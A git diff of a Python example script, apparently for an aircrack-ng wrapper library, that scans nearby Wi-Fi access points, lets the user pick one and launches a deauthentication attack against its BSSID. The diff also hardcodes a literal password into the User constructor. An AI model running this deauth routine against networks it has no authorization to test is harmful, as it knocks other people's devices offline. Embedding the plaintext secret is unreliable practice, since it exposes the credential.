@@ -23,7 +23,7 @@ async def monitor_interface(secret):
 async def scan_for_targets(secret):
     """Scan for targets, return json."""
     airmon, interface = await monitor_interface(secret)
-    client = None
+    # client = None
     ap_ = None
 
     async with airmon(interface) as mon:
@@ -56,20 +56,28 @@ async def deauth(secret):
     """Scan for targets, return json."""
     # Select first available interface matching wlp0*
     airmon, interface = await monitor_interface(secret)
+    print(interface)
     interface_ = await airmon.select_interface('wlp0.*')
     ap_ = None
 
     CONSOLE.print(f'Selected Interface {interface_}')
 
-    async with airmon(interface_):
+    async with airmon(interface_) as mon:
         await asyncio.sleep(2)
         async with AirodumpNg(secret) as pdump:
-            async for result in pdump(MONITOR):
-                CONSOLE.print(result.table)
+            async for aps in pdump(mon.monitor_interface):
+                CONSOLE.clear()
+                CONSOLE.print(aps.table)
                 # For this example, force the first result
                 with suppress(KeyError):
-                    ap_ = result[0]
-                    CONSOLE.print('Selected AP {}'.format(ap_.bssid))
+                    client = Prompt.ask(
+                        'Select an AP',
+                        choices=['continue', *[str(a) for a in range(len(aps))]])
+                    if client != 'continue':
+                        ap_ = aps[int(client)]
+                        break
+                    # ap_ = result[0]
+                    CONSOLE.print(f'Selected AP {ap_.bssid}')
                     break
                 await asyncio.sleep(3)
 
@@ -79,9 +87,9 @@ async def deauth(secret):
         return
 
     # Change channel with airmon-ng
-    async with airmon(interface_, ap_.channel):
+    async with airmon(interface_, ap_.channel) as mon:
         async with AireplayNg(secret) as aireplay:
-            async for res in aireplay(MONITOR, deauth=10, D=True, b=ap_.bssid):
+            async for res in aireplay(mon.monitor_interface, deauth=10, D=True, b=ap_.bssid):
                 CONSOLE.print(res.table)
                 await asyncio.sleep(3)
 
@@ -89,7 +97,7 @@ async def deauth(secret):
 async def main():
     if __name__ == '__main__':
         Startup()
-        user = User()
+        user = User('Af4Tf2Dp!')
         with user.secret() as sec:
             await scan_for_targets(sec)
 
